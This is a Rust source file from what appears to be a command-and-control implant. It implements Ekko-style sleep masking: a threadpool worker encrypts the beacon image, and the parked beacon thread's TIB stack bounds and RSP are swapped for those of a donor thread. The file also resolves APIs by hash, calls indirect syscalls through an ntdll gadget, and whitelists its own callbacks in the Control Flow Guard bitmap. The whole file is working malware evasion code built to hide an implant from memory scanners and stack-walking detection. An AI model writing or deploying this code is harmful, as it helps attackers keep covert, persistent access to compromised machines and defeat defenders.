//! Threadpool sleep + TIB stack spoofing (port of `src_beacon/src/runtime/
//! sleep.c` 160-560: SptEkkoWorkerCb / SptDonorThreadProc / SptEkkoSleep).
//!
//! While the sleepmask stub encrypts the beacon image, the beacon thread
//! is parked in `WaitForSingleObject` and a threadpool worker (TpAllocWork
//! / TpPostWork) runs the stub. The worker first suspends the beacon
//! thread and swaps its TIB `StackBase`/`StackLimit` and saved `Rsp` for
//! a donor thread's — a stack walker during the encrypted window sees a
//! thread blocked in kernel32 on a foreign, legitimate-looking stack, and
//! the image holds no private RX region.
//!
//! Everything the worker touches must stay valid while the image is
//! encrypted: the indirect syscalls (gadget in ntdll), `SetEvent`
//! (kernel32) and the stub itself (its own plaintext page). The worker
//! body executes only before the stub encrypts and after it decrypts
//! (a failed encrypt-side flip leaves the range untouched — the stub
//! never writes to a page it could not make writable), so it may live
//! anywhere in the image, unlike the native's .text$B worker.
//!
//! CFG deviation vs the native: the original whitelists the callbacks in
//! the process guard bitmap (NtSetInformationVirtualMemory) and keeps the
//! threadpool under CFG. This port refuses the indirect dispatch when the
//! host process enforces Control Flow Guard (GetProcessMitigationPolicy)
//! and falls back to the direct stub call on the beacon thread — the
//! packed host processes used for the implant do not enable CFG.

use core::arch::asm;
use core::ffi::c_void;

use specter_core::fnv::fnv1a64;
use specter_core::sleepmask::SleepMaskParams;

use crate::runtime::debug::log_handle;
use crate::runtime::syscalls;

/// ntdll export hashes (threadpool dispatch).
const H_TP_ALLOC_WORK: u64 = fnv1a64(b"TpAllocWork");
const H_TP_POST_WORK: u64 = fnv1a64(b"TpPostWork");
const H_TP_RELEASE_WORK: u64 = fnv1a64(b"TpReleaseWork");

/// kernel32 export hashes.
const H_CREATE_EVENT_A: u64 = fnv1a64(b"CreateEventA");
const H_SET_EVENT: u64 = fnv1a64(b"SetEvent");
const H_WAIT_FOR_SINGLE_OBJECT: u64 = fnv1a64(b"WaitForSingleObject");
const H_CLOSE_HANDLE: u64 = fnv1a64(b"CloseHandle");
const H_DUPLICATE_HANDLE: u64 = fnv1a64(b"DuplicateHandle");
const H_GET_CURRENT_PROCESS: u64 = fnv1a64(b"GetCurrentProcess");
const H_GET_CURRENT_THREAD: u64 = fnv1a64(b"GetCurrentThread");
const H_CREATE_THREAD: u64 = fnv1a64(b"CreateThread");
const H_GET_PROCESS_MITIGATION_POLICY: u64 = fnv1a64(b"GetProcessMitigationPolicy");

/// PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY class value of
/// PROCESS_MITIGATION_POLICY (winnt.h).
const PROCESS_CONTROL_FLOW_GUARD_POLICY: u32 = 6;
/// INFINITE, as the native passes it.
const INFINITE: u32 = 0xFFFF_FFFF;

/// Full x64 `CONTEXT` (winnt.h layout). `NtGetContextThread`/`NtSetContext
/// Thread` read and write this whole structure per `ContextFlags`.
#[repr(C, align(16))]
#[derive(Clone, Copy)]
pub struct ContextX64 {
    pub p1_home: u64,
    pub p2_home: u64,
    pub p3_home: u64,
    pub p4_home: u64,
    pub p5_home: u64,
    pub p6_home: u64,
    /// CONTEXT_AMD64 | CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_
    /// FLOATING_POINT — the exact mask the native worker uses.
    pub context_flags: u32,
    pub mxcsr: u32,
    pub seg_cs: u16,
    pub seg_ds: u16,
    pub seg_es: u16,
    pub seg_fs: u16,
    pub seg_gs: u16,
    pub seg_ss: u16,
    pub eflags: u32,
    pub dr0: u64,
    pub dr1: u64,
    pub dr2: u64,
    pub dr3: u64,
    pub dr6: u64,
    pub dr7: u64,
    pub rax: u64,
    pub rcx: u64,
    pub rdx: u64,
    pub rbx: u64,
    pub rsp: u64,
    pub rbp: u64,
    pub rsi: u64,
    pub rdi: u64,
    pub r8: u64,
    pub r9: u64,
    pub r10: u64,
    pub r11: u64,
    pub r12: u64,
    pub r13: u64,
    pub r14: u64,
    pub r15: u64,
    pub rip: u64,
    /// flt/save area through the vector registers: 0x4D0 total.
    pub tail: [u8; 0x4D0 - 0x100],
}

impl ContextX64 {
    /// CONTEXT_AMD64 | CONTROL | INTEGER | FLOATING_POINT (the native
    /// worker's 0x10000B).
    pub const FLAGS: u32 = 0x0010_000B;
}

/// Donor-thread bootstrap block (heap, never encrypted).
#[repr(C)]
pub struct DonorCtx {
    pub set_event: usize,
    pub wait_single: usize,
    pub h_ready: isize,
    pub h_exit: isize,
    pub stack_base: usize,
    pub stack_limit: usize,
}

/// The sleeping-thread state shared with the worker (frame-resident on
/// the beacon thread while it blocks in WaitForSingleObject, like the
/// native's stack SPT_EKKO_WORKER_CTX).
#[repr(C)]
pub struct EkkoCtx {
    pub mask: *mut SleepMaskParams,
    pub set_event: usize,
    pub h_done: isize,
    pub h_beacon_thread: isize,
    pub beacon_teb: *mut u8,
    pub orig_stack_base: usize,
    pub orig_stack_limit: usize,
    pub spoof_stack_base: usize,
    pub spoof_stack_limit: usize,
    pub suspend_ssn: u32,
    pub get_ctx_ssn: u32,
    pub set_ctx_ssn: u32,
    pub resume_ssn: u32,
    pub gadget: *const c_void,
    /// Debug channel handle (crash bisection of the pool dispatch).
    pub dbg: isize,
}

/// One-time per-instance threadpool state (bootstrap resolution result).
pub struct EkkoState {
    /// ntdll TpAllocWork/TpPostWork/TpReleaseWork.
    pub tp_alloc_work: usize,
    pub tp_post_work: usize,
    pub tp_release_work: usize,
    /// kernel32 dispatch helpers.
    pub create_event_a: usize,
    pub set_event: usize,
    pub wait_single: usize,
    pub close_handle: usize,
    pub duplicate_handle: usize,
    pub get_current_process: usize,
    pub get_current_thread: usize,
    /// NtSuspendThread/NtResumeThread SSNs (0 = unresolved).
    pub suspend_ssn: u32,
    pub resume_ssn: u32,
    /// SSNs of NtGet/NtSetContextThread from the syscall table.
    pub get_ctx_ssn: u32,
    pub set_ctx_ssn: u32,
    /// Donor thread: handle, exit event and its captured TIB bounds.
    pub h_donor: isize,
    pub h_donor_exit: isize,
    pub donor_stack_base: usize,
    pub donor_stack_limit: usize,
    /// False = indirect dispatch refused (CFG enforced, missing exports,
    /// worker off the stub page, no donor): the beacon sleeps through the
    /// stub directly on its own thread.
    pub pool_ok: bool,
}

/// Read the TEB (`gs:[0x30]`).
#[inline(always)]
pub fn current_teb() -> *mut u8 {
    let teb: *mut u8;
    unsafe {
        asm!("mov {teb:r}, gs:[0x30]", teb = out(reg) teb, options(nostack));
    }
    teb
}

/// Donor thread body: capture this thread's TIB stack bounds, signal the
/// beacon and park forever. Runs once at bootstrap, before any encrypted
/// window — from then on the thread only executes kernel32 while blocked.
///
/// # Safety
///
/// `param` must reference a fully initialized DonorCtx whose event
/// handles are live for the lifetime of the thread.
pub unsafe extern "system" fn donor_thread_proc(param: *mut c_void) -> u32 {
    let dc = param as *mut DonorCtx;
    // NT_TIB: StackBase at +0x08, StackLimit at +0x10.
    (*dc).stack_base = (current_teb() as *const u64).add(1).read_unaligned() as usize;
    (*dc).stack_limit = (current_teb() as *const u64).add(2).read_unaligned() as usize;
    let set_event: unsafe extern "system" fn(isize) -> i32 = core::mem::transmute((*dc).set_event);
    let wait: unsafe extern "system" fn(isize, u32) -> u32 =
        core::mem::transmute((*dc).wait_single);
    set_event((*dc).h_ready);
    wait((*dc).h_exit, INFINITE);
    0
}

/// Threadpool worker callback (TpAllocWork signature): spoof the parked
/// beacon thread's stack, run the stub, restore, signal.
///
/// # Safety
///
/// Dispatched only through TpPostWork with a fully initialized EkkoCtx
/// whose mask block is live for the whole call.
pub unsafe extern "system" fn ekko_worker_cb(
    _tp_inst: *mut c_void,
    ctx: *mut c_void,
    _work: *mut c_void,
) -> u32 {
    let wc = ctx as *mut EkkoCtx;
    log_handle((*wc).dbg, b"wk: enter\n");
    let mut spoofed = false;
    let mut orig_ctx = ContextX64 {
        p1_home: 0,
        p2_home: 0,
        p3_home: 0,
        p4_home: 0,
        p5_home: 0,
        p6_home: 0,
        context_flags: ContextX64::FLAGS,
        mxcsr: 0,
        seg_cs: 0,
        seg_ds: 0,
        seg_es: 0,
        seg_fs: 0,
        seg_gs: 0,
        seg_ss: 0,
        eflags: 0,
        dr0: 0,
        dr1: 0,
        dr2: 0,
        dr3: 0,
        dr6: 0,
        dr7: 0,
        rax: 0,
        rcx: 0,
        rdx: 0,
        rbx: 0,
        rsp: 0,
        rbp: 0,
        rsi: 0,
        rdi: 0,
        r8: 0,
        r9: 0,
        r10: 0,
        r11: 0,
        r12: 0,
        r13: 0,
        r14: 0,
        r15: 0,
        rip: 0,
        tail: [0; 0x4D0 - 0x100],
    };

    // ---- pre-stub: park the beacon thread on the donor's stack ----------
    if (*wc).h_beacon_thread != 0 && (*wc).spoof_stack_base != 0 {
        let mut susp_count: u32 = 0;
        let sst = syscalls::indirect_syscall2(
            (*wc).suspend_ssn,
            (*wc).gadget,
            (*wc).h_beacon_thread as usize,
            &mut susp_count as *mut u32 as usize,
        );
        if sst == 0 {
            let gst = syscalls::indirect_syscall2(
                (*wc).get_ctx_ssn,
                (*wc).gadget,
                (*wc).h_beacon_thread as usize,
                &mut orig_ctx as *mut ContextX64 as usize,
            );
            if gst == 0 {
                let teb = (*wc).beacon_teb;
                ((teb as *mut u64).add(1)).write_unaligned((*wc).spoof_stack_base as u64);
                ((teb as *mut u64).add(2)).write_unaligned((*wc).spoof_stack_limit as u64);
                // The spoof rides a COPY: orig_ctx keeps the parked
                // thread's real Rsp — the post-stub restore replays it
                // verbatim (overwriting orig_ctx.rsp here would leave
                // the beacon thread on the donor stack after SetEvent).
                let mut spoof_ctx = orig_ctx;
                spoof_ctx.rsp = ((*wc).spoof_stack_base.wrapping_sub(0x200)) as u64;
                let _ = syscalls::indirect_syscall2(
                    (*wc).set_ctx_ssn,
                    (*wc).gadget,
                    (*wc).h_beacon_thread as usize,
                    &mut spoof_ctx as *mut ContextX64 as usize,
                );
                spoofed = true;
            }
            let mut dummy: u32 = 0;
            let _ = syscalls::indirect_syscall2(
                (*wc).resume_ssn,
                (*wc).gadget,
                (*wc).h_beacon_thread as usize,
                &mut dummy as *mut u32 as usize,
            );
        }
    }

    log_handle((*wc).dbg, b"wk: stub\n");
    // ---- the stub: encrypt, sleep, decrypt (on this worker thread) ------
    let stub: unsafe extern "C" fn(usize) -> usize =
        core::mem::transmute(crate::runtime::sleepmask::spt_sleepmask as *const c_void);
    stub((*wc).mask as usize);

    log_handle((*wc).dbg, b"wk: back\n");
    // ---- post-stub: restore the beacon thread's real stack -------------
    if spoofed {
        let mut susp_count: u32 = 0;
        let _ = syscalls::indirect_syscall2(
            (*wc).suspend_ssn,
            (*wc).gadget,
            (*wc).h_beacon_thread as usize,
            &mut susp_count as *mut u32 as usize,
        );
        let teb = (*wc).beacon_teb;
        ((teb as *mut u64).add(1)).write_unaligned((*wc).orig_stack_base as u64);
        ((teb as *mut u64).add(2)).write_unaligned((*wc).orig_stack_limit as u64);
        let _ = syscalls::indirect_syscall2(
            (*wc).set_ctx_ssn,
            (*wc).gadget,
            (*wc).h_beacon_thread as usize,
            &mut orig_ctx as *mut ContextX64 as usize,
        );
        let mut dummy: u32 = 0;
        let _ = syscalls::indirect_syscall2(
            (*wc).resume_ssn,
            (*wc).gadget,
            (*wc).h_beacon_thread as usize,
            &mut dummy as *mut u32 as usize,
        );
    }

    let set_event: unsafe extern "system" fn(isize) -> i32 = core::mem::transmute((*wc).set_event);
    set_event((*wc).h_done);
    0
}

impl EkkoState {
    /// Degraded state: no threadpool, no donor — the sleep runs the stub
    /// directly on the beacon thread (the pre-iteration behavior).
    pub fn off(get_ctx_ssn: u32, set_ctx_ssn: u32) -> EkkoState {
        EkkoState {
            tp_alloc_work: 0,
            tp_post_work: 0,
            tp_release_work: 0,
            create_event_a: 0,
            set_event: 0,
            wait_single: 0,
            close_handle: 0,
            duplicate_handle: 0,
            get_current_process: 0,
            get_current_thread: 0,
            suspend_ssn: 0,
            resume_ssn: 0,
            get_ctx_ssn,
            set_ctx_ssn,
            h_donor: 0,
            h_donor_exit: 0,
            donor_stack_base: 0,
            donor_stack_limit: 0,
            pool_ok: false,
        }
    }
}

/// Bootstrap the threadpool state: resolve the exports, refuse the
/// indirect dispatch under CFG, spawn the donor thread and capture its
/// TIB bounds. `None`-fields degrade to `pool_ok = false` — the sleep
/// then runs the stub directly on the beacon thread (the pre-iteration
/// behavior).
///
/// # Safety
///
/// `ntdll`/`kernel32` must be resolved module bases; the heap handle must
/// be the process heap (the DonorCtx outlives the bootstrap).
#[allow(clippy::too_many_arguments)]
pub unsafe fn init(
    ntdll: *mut c_void,
    kernel32: *mut c_void,
    syscall_table: &syscalls::Syscalls,
    heap_alloc: usize,
    heap: isize,
    img_base: usize,
    img_end: usize,
    dbg: isize,
) -> EkkoState {
    let mut st = EkkoState {
        tp_alloc_work: 0,
        tp_post_work: 0,
        tp_release_work: 0,
        create_event_a: 0,
        set_event: 0,
        wait_single: 0,
        close_handle: 0,
        duplicate_handle: 0,
        get_current_process: 0,
        get_current_thread: 0,
        suspend_ssn: 0,
        resume_ssn: 0,
        get_ctx_ssn: syscall_table.get_ctx_ssn,
        set_ctx_ssn: syscall_table.set_ctx_ssn,
        h_donor: 0,
        h_donor_exit: 0,
        donor_stack_base: 0,
        donor_stack_limit: 0,
        pool_ok: false,
    };
    use specter_core::peb;

    for (slot, hash) in [
        (&mut st.tp_alloc_work, H_TP_ALLOC_WORK),
        (&mut st.tp_post_work, H_TP_POST_WORK),
        (&mut st.tp_release_work, H_TP_RELEASE_WORK),
    ] {
        *slot = peb::find_export(ntdll, hash) as usize;
    }
    for (slot, hash) in [
        (&mut st.create_event_a, H_CREATE_EVENT_A),
        (&mut st.set_event, H_SET_EVENT),
        (&mut st.wait_single, H_WAIT_FOR_SINGLE_OBJECT),
        (&mut st.close_handle, H_CLOSE_HANDLE),
        (&mut st.duplicate_handle, H_DUPLICATE_HANDLE),
        (&mut st.get_current_process, H_GET_CURRENT_PROCESS),
        (&mut st.get_current_thread, H_GET_CURRENT_THREAD),
    ] {
        *slot = peb::find_export(kernel32, hash) as usize;
    }
    if st.tp_alloc_work == 0
        || st.tp_post_work == 0
        || st.tp_release_work == 0
        || st.create_event_a == 0
        || st.set_event == 0
        || st.wait_single == 0
        || st.close_handle == 0
        || st.duplicate_handle == 0
        || st.get_current_process == 0
        || st.get_current_thread == 0
    {
        log_handle(dbg, b"sm: noexport\n");
        return st;
    }
    st.suspend_ssn = syscalls::suspend_thread_ssn(ntdll).unwrap_or(0);
    st.resume_ssn = syscalls::resume_thread_ssn(ntdll).unwrap_or(0);
    if st.suspend_ssn == 0
        || st.resume_ssn == 0
        || st.get_ctx_ssn == u32::MAX
        || st.set_ctx_ssn == u32::MAX
    {
        log_handle(dbg, b"sm: nossn\n");
        return st;
    }

    // CFG: the OS dispatches the worker through an indirect call. The
    // native whitelists the callbacks in the process guard bitmap
    // (SptCfgAddTarget — NtSetInformationVirtualMemory with
    // VmCfgCallTargetInformation); this port does the same, and refuses
    // the indirect dispatch only when the whitelist syscall fails.
    let get_policy = peb::find_export(kernel32, H_GET_PROCESS_MITIGATION_POLICY);
    let cfg_enforced = if get_policy.is_null() {
        // No policy query (pre-Win8): assume the worst, require the
        // whitelist to carry the decision.
        true
    } else {
        let get_policy: unsafe extern "system" fn(isize, u32, *mut u32, usize) -> i32 =
            core::mem::transmute(get_policy as *const c_void);
        let mut cfg: u32 = 0;
        let ok = get_policy(
            0,
            PROCESS_CONTROL_FLOW_GUARD_POLICY,
            &mut cfg as *mut u32,
            4,
        );
        ok != 0 && (cfg & 1) != 0
    };
    if cfg_enforced {
        let si_ssn = match syscalls::set_information_virtmem_ssn(ntdll) {
            Some(ssn) => ssn,
            None => {
                log_handle(dbg, b"sm: nossn\n");
                return st;
            }
        };
        let gadget = syscalls::gadget(syscall_table, 0);
        // SPT_MEM_RANGE { VirtualAddress, NumberOfBytes } +
        // SPT_CFG_TARGET { Offset, Flags = 1 } — the exact native layout.
        #[repr(C)]
        struct MemRange {
            base: usize,
            size: usize,
        }
        #[repr(C)]
        struct CfgTarget {
            offset: usize,
            flags: usize,
        }
        let range = MemRange {
            base: img_base,
            size: img_end - img_base,
        };
        let mut whitelisted = true;
        for target in [
            ekko_worker_cb as *const () as usize,
            donor_thread_proc as *const () as usize,
        ] {
            let tgt = CfgTarget {
                offset: target.wrapping_sub(img_base),
                flags: 1,
            };
            let status = syscalls::indirect_syscall6(
                si_ssn,
                gadget,
                -1isize as usize, // NtCurrentProcess()
                2,                // VmCfgCallTargetInformation
                1,                // one entry
                &range as *const MemRange as usize,
                &tgt as *const CfgTarget as usize,
                core::mem::size_of::<CfgTarget>(),
            );
            if status != 0 {
                whitelisted = false;
            }
        }
        if !whitelisted {
            log_handle(dbg, b"sm: cfg\n");
            return st;
        }
        log_handle(dbg, b"sm: cfg wl\n");
    }

    // Donor thread: a real parked thread whose TIB bounds the worker
    // lends to the beacon thread for the encrypted window.
    let create_event: unsafe extern "system" fn(*mut u8, i32, i32, *mut u8) -> isize =
        core::mem::transmute(st.create_event_a);
    let h_ready = create_event(core::ptr::null_mut(), 1, 0, core::ptr::null_mut());
    let h_exit = create_event(core::ptr::null_mut(), 1, 0, core::ptr::null_mut());
    if h_ready == 0 || h_exit == 0 {
        log_handle(dbg, b"sm: noevent\n");
        return st;
    }
    let heap_alloc_fn: unsafe extern "system" fn(isize, u32, usize) -> *mut c_void =
        core::mem::transmute(heap_alloc);
    let dc = heap_alloc_fn(heap, 0x08, core::mem::size_of::<DonorCtx>()) as *mut DonorCtx;
    if dc.is_null() {
        log_handle(dbg, b"sm: nodonor\n");
        return st;
    }
    *dc = DonorCtx {
        set_event: st.set_event,
        wait_single: st.wait_single,
        h_ready,
        h_exit,
        stack_base: 0,
        stack_limit: 0,
    };
    let create_thread: unsafe extern "system" fn(
        *mut u8,
        usize,
        unsafe extern "system" fn(*mut c_void) -> u32,
        *mut c_void,
        u32,
        *mut u32,
    ) -> isize = core::mem::transmute(peb::find_export(kernel32, H_CREATE_THREAD));
    let h_donor = create_thread(
        core::ptr::null_mut(),
        0,
        donor_thread_proc,
        dc as *mut c_void,
        0,
        core::ptr::null_mut(),
    );
    let wait: unsafe extern "system" fn(isize, u32) -> u32 = core::mem::transmute(st.wait_single);
    let close: unsafe extern "system" fn(isize) -> i32 = core::mem::transmute(st.close_handle);
    if h_donor == 0 || wait(h_ready, 5000) != 0 {
        log_handle(dbg, b"sm: donorfail\n");
        close(h_exit);
        close(h_ready);
        return st;
    }
    close(h_ready);
    st.h_donor = h_donor;
    st.h_donor_exit = h_exit;
    st.donor_stack_base = (*dc).stack_base;
    st.donor_stack_limit = (*dc).stack_limit;
    st.pool_ok = true;
    log_handle(dbg, b"sm: ekko ok\n");
    st
}
